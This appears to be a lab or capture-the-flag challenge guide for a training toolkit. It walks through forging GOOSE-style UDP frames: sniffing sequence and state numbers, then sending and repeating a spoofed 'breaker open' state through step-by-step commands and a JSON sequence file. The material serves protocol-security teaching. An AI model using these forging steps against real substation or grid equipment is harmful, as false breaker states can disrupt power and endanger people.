# Challenge 5 — Second Blackout

**Protocol:** GOOSE training stream · **Port:** 6180/udp · **Toolkit module:** `goose`

---

## The Story

A breaker's state is published over a GOOSE-style UDP stream. If you can observe the live
sequence numbers and status revision, you can forge a frame the subscriber accepts as newer than
reality — and flip what it believes the breaker is doing.

## What You Know

- Target is `10.0.1.1:6180` (UDP; the toolkit does not actively probe this port, only
  passively listens).
- GOOSE "freshness" is judged by the receiver on `stNum` (state number — increments only when the
  actual state changes) and `sqNum` (sequence number — increments on every repeat of the same
  state). A forged frame needs to look like a legitimate next state.
- `sysrupt sequence` can fire a timed, ordered series of commands over one connection — useful for
  sustaining a forged state with repeated sends, since one frame alone won't hold.

---

## Step 1: Listen and capture the real traffic

<details>
<summary>Hint</summary>

Don't guess APPID, confRev, or the current stNum/sqNum — sniff them.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt goose sniff --seconds 5
```

Note down `APPID`, `confRev`, the current `stNum`, and the `breaker_open` flag from the captured
frames.
</details>

## Step 2: Work out what a forged "next" frame needs to look like

<details>
<summary>Hint</summary>

If the real stream is currently at stNum = N, what value makes your frame look like a genuine
new state change rather than a stale repeat?
</details>

<details>
<summary>Another hint</summary>

stNum should increment by 1 from what you observed. sqNum resets to 0 on a state change, then
increments with each repeat — so to sustain it, send several frames with sqNum 0, 1, 2…
</details>

<details>
<summary>Show command (single frame)</summary>

```bash
./bin/sysrupt goose send --appid <APPID_FROM_SNIFF> --stnum <OBSERVED_STNUM + 1> \
  --confrev <CONFREV_FROM_SNIFF> --sqnum 0 --open
```
</details>

## Step 3: Sustain the forged state

<details>
<summary>Hint</summary>

One frame won't hold — the subscriber will fall back to the last legitimate state if yours isn't
repeated. Build a sequence file instead of firing single commands by hand.
</details>

<details>
<summary>Show command</summary>

Save as `goose-sustain.seq.json`:

```json
{
  "name": "goose-sustain",
  "description": "repeated sends to hold forged stNum/sqnum",
  "steps": [
    { "command": "goose send --appid <APPID> --stnum <N+1> --confrev <CONFREV> --sqnum 0 --open" },
    { "command": "goose send --appid <APPID> --stnum <N+1> --confrev <CONFREV> --sqnum 1 --open", "delay_before_ms": 300 },
    { "command": "goose send --appid <APPID> --stnum <N+1> --confrev <CONFREV> --sqnum 2 --open", "delay_before_ms": 300 }
  ]
}
```

```bash
./bin/sysrupt sequence validate goose-sustain.seq.json
./bin/sysrupt sequence run goose-sustain.seq.json
```

Add more steps with increasing `sqnum` if you need to hold the state longer, or re-run the
sequence.
</details>

## What You Learned

- How GOOSE freshness/anti-replay works at a basic level: `stNum` for real state changes,
  `sqNum` for repeats of the same state.
- Why a single forged frame isn't enough to hold a false state, and how to use `sysrupt sequence`
  to sustain repeated sends instead of hand-writing a shell loop.
